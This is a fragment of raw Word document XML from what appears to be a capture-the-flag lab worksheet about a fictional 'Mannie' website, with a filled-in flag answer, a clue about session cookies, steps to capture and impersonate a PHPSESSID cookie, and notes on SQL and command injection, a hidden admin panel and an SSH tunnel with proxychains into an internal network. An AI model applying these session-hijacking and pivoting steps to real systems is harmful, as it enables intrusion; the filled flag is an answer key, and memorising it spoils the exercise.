          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>23</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="18"/>
        <w:ind w:left="2124" w:right="7085"/>
        <w:jc w:val="center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(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imu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 th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part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 lab)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="11" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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V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isit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he O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rv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ons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g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e to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v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iew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nn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’s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ge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o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nn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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Ch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nge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URL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/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nni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_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s.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p</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Capture the Flag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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lag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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2"/>
          <w:position w:val="-1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1"/>
          <w:position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position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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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3"/>
          <w:position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-1"/>
          <w:position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here:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="009A7B07">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>FLAG{4b0e3f760ae0}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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7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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Clue to the </w:t>
      </w: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N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>x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 xml:space="preserve">t </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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2"/>
          <w:position w:val="-1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1"/>
          <w:position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position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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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3"/>
          <w:position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1"/>
          <w:position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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pict>
          <v:group id="_x0000_s1080" style="position:absolute;left:0;text-align:left;margin-left:125.5pt;margin-top:1.35pt;width:333.45pt;height:13.5pt;z-index:-1883;mso-position-horizontal-relative:page" coordorigin="2510,27" coordsize="6669,270">
            <v:shape id="_x0000_s1082" style="position:absolute;left:2520;top:37;width:6649;height:250" coordorigin="2520,37" coordsize="6649,250" path="m2520,287r6649,l9169,37r-6649,l2520,287xe" fillcolor="aqua" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1081" style="position:absolute;left:3121;top:261;width:6050;height:0" coordorigin="3121,261" coordsize="6050,0" path="m3121,261r6049,e" filled="f" strokecolor="gray" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE:</w:t>
      </w:r>
      <w:r w:rsidR="009A7B07" w:rsidRPr="009A7B07">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009A7B07" w:rsidRPr="009A7B07">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Mannie's cookie is more than just a snack. Feed it to your browser and step right in.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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8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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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V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erify</w:t>
      </w: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that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y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ou c</w:t>
      </w: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a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>p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tured</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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Man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>n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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2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’s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ookie</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Check y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ur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K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li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iste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er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Ma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nie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’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okie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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If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y,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g6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St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ep 4 Impe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e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ie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 c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color w:val="404040"/>
          <w:spacing w:val="-4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ure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nie’s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okie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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v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e the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kie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v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lue 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 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ext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il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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2520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(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e.g. PHPSESSI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D=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8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b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752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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8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4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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3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96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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4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27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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4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87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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>95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5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e2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8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7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9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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5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69</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b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)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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9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. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="38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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-37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In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nnie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_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s.ph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,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v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iew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he pa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g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e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urce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ent:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-- generated by Mannie Service Engine -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1085"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1031" type="#_x0000_t75" style="width:498pt;height:126pt">
            <v:imagedata r:id="rId36" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1637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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">What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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>W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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>e Know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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>So F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>r:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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We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si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 is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v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nerab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 to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QL injec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ion and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mm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and injec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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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Hid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en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ge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/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min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/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ol_pa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el.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hp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FL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G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1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nd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UE1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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SS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H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un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el wi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xyc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ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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nd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o’s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ntials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o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he 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nte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l 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get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netwo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k</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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172.31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.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1.1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1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/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me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/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/b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nking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/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lagg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_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x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.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mp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nta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FLA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G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2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nd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2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1637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\\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17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2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.31.1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.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12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\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x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y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\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x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y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\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ientX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\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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ientX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_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246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0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1.jpg (000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0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010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9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.xlsx)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ntains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FL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G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3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
